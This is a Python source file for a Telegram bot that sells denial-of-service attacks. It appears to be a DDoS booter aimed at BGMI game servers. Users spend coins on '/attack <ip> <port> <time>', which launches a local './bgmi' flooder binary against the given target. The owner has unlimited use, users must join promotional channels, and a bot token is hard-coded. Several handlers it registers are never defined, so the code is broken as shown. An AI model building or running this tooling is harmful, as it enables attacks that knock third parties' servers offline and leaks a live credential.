import subprocess
import time
import os
import psutil
import pickle
from telegram import Update
from telegram.ext import Updater, CommandHandler, CallbackContext
from datetime import datetime, timedelta
import threading

BINARY_PATH = "./bgmi"
OWNER_ID = 7221087191
REQUIRED_CHANNELS = ["@vofcodinghub", "@voffeeds"]

user_data = {}
attack_logs = []
admins = [OWNER_ID]

max_attack_time = 120  # Default max attack time in seconds
cooldown_time = 10  # Default cooldown time in minutes

USER_DATA_FILE = "user_data.pkl"  # File to save user data

def load_user_data():
    global user_data
    if os.path.exists(USER_DATA_FILE):
        with open(USER_DATA_FILE, "rb") as file:
            user_data = pickle.load(file)

def save_user_data():
    with open(USER_DATA_FILE, "wb") as file:
        pickle.dump(user_data, file)

def is_user_in_channels(user_id: int, context: CallbackContext) -> bool:
    try:
        for channel in REQUIRED_CHANNELS:
            status = context.bot.get_chat_member(channel, user_id).status
            if status not in ["member", "administrator", "creator"]:
                return False
        return True
    except Exception:
        return False

def execute_attack(ip: str, port: int, duration: int) -> str:
    try:
        result = subprocess.run(
            [BINARY_PATH, ip, str(port), str(duration)],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        if result.returncode == 0:
            return f"✅ Attack started successfully on {ip}:{port} for {duration} seconds."
        else:
            return f"❌ Failed to start the attack.\nError: {result.stderr}"
    except Exception as e:
        return f"❌ An error occurred: {str(e)}"

def reset_daily_coins():
    current_time = datetime.now()
    for user_id, data in user_data.items():
        if "last_reset" not in data or data["last_reset"].date() < current_time.date():
            data["last_reset"] = current_time
            data["can_claim"] = True

def claim_command(update: Update, context: CallbackContext) -> None:
    user_id = update.effective_user.id
    reset_daily_coins()
    if user_id not in user_data:
        user_data[user_id] = {"coins": 10, "attacks": set(), "freeze_until": None, "last_reset": datetime.now(), "can_claim": False}
    user = user_data[user_id]
    if not user["can_claim"]:
        update.message.reply_text("❌ You have already claimed your daily coins.")
        return
    user["coins"] += 10
    user["can_claim"] = False
    save_user_data()
    update.message.reply_text("✅ You have successfully claimed 10 coins!")

def coins_command(update: Update, context: CallbackContext) -> None:
    user_id = update.effective_user.id
    reset_daily_coins()
    if user_id not in user_data:
        user_data[user_id] = {"coins": 10, "attacks": set(), "freeze_until": None, "last_reset": datetime.now(), "can_claim": True}
    user = user_data[user_id]
    update.message.reply_text(f"💰 You have {user['coins']} coins.")

def admin_command(update: Update, context: CallbackContext) -> None:
    user_id = update.effective_user.id
    if user_id not in admins:
        update.message.reply_text("❌ You are not authorized to use this command.")
        return
    args = context.args
    if len(args) < 2:
        update.message.reply_text("❌ Usage: /admin <add/remove/set/reset> <user_id> [amount]")
        return
    action, target_id = args[0], int(args[1])
    target_data = user_data.setdefault(target_id, {"coins": 10, "attacks": set(), "freeze_until": None, "last_reset": datetime.now(), "can_claim": True})
    if action == "add" and len(args) == 3:
        amount = int(args[2])
        target_data["coins"] += amount
        save_user_data()
        update.message.reply_text(f"✅ Added {amount} coins to user {target_id}.")
    elif action == "remove" and len(args) == 3:
        amount = int(args[2])
        target_data["coins"] = max(0, target_data["coins"] - amount)
        save_user_data()
        update.message.reply_text(f"✅ Removed {amount} coins from user {target_id}.")
    elif action == "set" and len(args) == 3:
        amount = int(args[2])
        target_data["coins"] = amount
        save_user_data()
        update.message.reply_text(f"✅ Set coins of user {target_id} to {amount}.")
    elif action == "reset":
        target_data["attacks"].clear()
        target_data["freeze_until"] = None
        save_user_data()
        update.message.reply_text(f"✅ Reset limits for user {target_id}.")
    else:
        update.message.reply_text("❌ Invalid command or arguments.")

def logs_command(update: Update, context: CallbackContext) -> None:
    user_id = update.effective_user.id
    if user_id not in admins:
        update.message.reply_text("❌ You are not authorized to use this command.")
        return
    with open("logs.txt", "w") as file:
        for log in attack_logs:
            file.write(f"{log['timestamp']} - User {log['user_id']} attacked {log['ip']}:{log['port']} for {log['duration']} seconds\n")
    with open("logs.txt", "rb") as file:
        context.bot.send_document(chat_id=update.effective_chat.id, document=file)

def attack_command(update: Update, context: CallbackContext) -> None:
    user_id = update.effective_user.id
    reset_daily_coins()
    if not is_user_in_channels(user_id, context):
        update.message.reply_text(f"❌ You must join all these channels to use this command: {', '.join(REQUIRED_CHANNELS)}")
        return
    if user_id not in user_data:
        user_data[user_id] = {"coins": 10, "attacks": set(), "freeze_until": None, "last_reset": datetime.now(), "can_claim": True}
    user = user_data[user_id]
    if user_id != OWNER_ID:
        if user["freeze_until"] and datetime.now() < user["freeze_until"]:
            remaining_time = (user["freeze_until"] - datetime.now()).seconds // 60
            update.message.reply_text(f"❌ You are frozen for {remaining_time} more minutes. Try again later.")
            return
        args = context.args
        if len(args) != 3:
            update.message.reply_text("❌ Usage: /attack <ip> <port> <time>")
            return
        try:
            ip, port, duration = args[0], int(args[1]), int(args[2])
        except ValueError:
            update.message.reply_text("❌ Invalid arguments. Ensure port and time are integers.")
            return
        if duration > max_attack_time:
            update.message.reply_text(f"❌ Maximum allowed attack time is {max_attack_time} seconds.")
            return
        attack_key = f"{ip}:{port}"
        if attack_key in user["attacks"]:
            update.message.reply_text("❌ You have already attacked this IP and port combination.")
            return
        if user["coins"] < 2:
            update.message.reply_text("❌ You do not have enough coins to run this attack. Each attack costs 2 coins.")
            return
        user["coins"] -= 2
        user["attacks"].add(attack_key)
        user["freeze_until"] = datetime.now() + timedelta(minutes=cooldown_time)
    else:
        args = context.args
        if len(args) != 3:
            update.message.reply_text("❌ Usage: /attack <ip> <port> <time>")
            return
        try:
            ip, port, duration = args[0], int(args[1]), int(args[2])
        except ValueError:
            update.message.reply_text("❌ Invalid arguments. Ensure port and time are integers.")
            return
    
    attack_logs.append({
        "user_id": user_id,
        "ip": ip,
        "port": port,
        "duration": duration,
        "timestamp": datetime.now()
    })

    def run_attack():
        response = execute_attack(ip, port, duration)
        update.message.reply_text(response)

    threading.Thread(target=run_attack).start()

    save_user_data()

def start_command(update: Update, context: CallbackContext) -> None:
    update.message.reply_text("👋 Welcome to the bot! Use /help to see all commands.")

def help_command(update: Update, context: CallbackContext) -> None:
    update.message.reply_text(
        "Available commands:\n"
        "/start - Start the bot\n"
        "/help - Show this help message\n"
        "/rules - Show rules for usage\n"
        "/coins - Check your coin balance\n"
        "/claim - Claim daily coins\n"
        "/attack <ip> <port> <time> - Launch an attack (2 coins per attack)\n"
        "/logs - Show attack logs (Owner only)\n"
        "/admin <add/remove/set/reset> <user_id> [amount] - Manage user limits (Owner only)\n"
        "/maxtime <time_in_seconds> - Set max attack time (Owner only)\n"
        "/cooldown <time_in_minutes> - Set cooldown time (Owner only)\n"
    )

def rules_command(update: Update, context: CallbackContext) -> None:
    update.message.reply_text("🚨 Rules:\n1. Respect others.\n2. Follow all commands carefully.")

def runtime_command(update: Update, context: CallbackContext) -> None:
    # Add runtime stats collection logic
    update.message.reply_text("⏱ Running time stats: Not implemented yet")

def usage_command(update: Update, context: CallbackContext) -> None:
    # Replace with real usage stats
    update.message.reply_text("💻 VPS usage: Not implemented yet")

def main():
    load_user_data()
    updater = Updater("7239021384:AAEaeSs0Nn6ZRBr_Qz6WevriN-bPTKzZ1fc", use_context=True)
    dp = updater.dispatcher

    dp.add_handler(CommandHandler("start", start_command))
    dp.add_handler(CommandHandler("help", help_command))
    dp.add_handler(CommandHandler("rules", rules_command))
    dp.add_handler(CommandHandler("coins", coins_command))
    dp.add_handler(CommandHandler("claim", claim_command))
    dp.add_handler(CommandHandler("attack", attack_command))
    dp.add_handler(CommandHandler("admin", admin_command))
    dp.add_handler(CommandHandler("logs", logs_command))
    dp.add_handler(CommandHandler("runtime", runtime_command))
    dp.add_handler(CommandHandler("usage", usage_command))
    dp.add_handler(CommandHandler("addadmin", add_admin_command))
    dp.add_handler(CommandHandler("maxtime", maxtime_command))
    dp.add_handler(CommandHandler("cooldown", cooldown_command))

    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main()
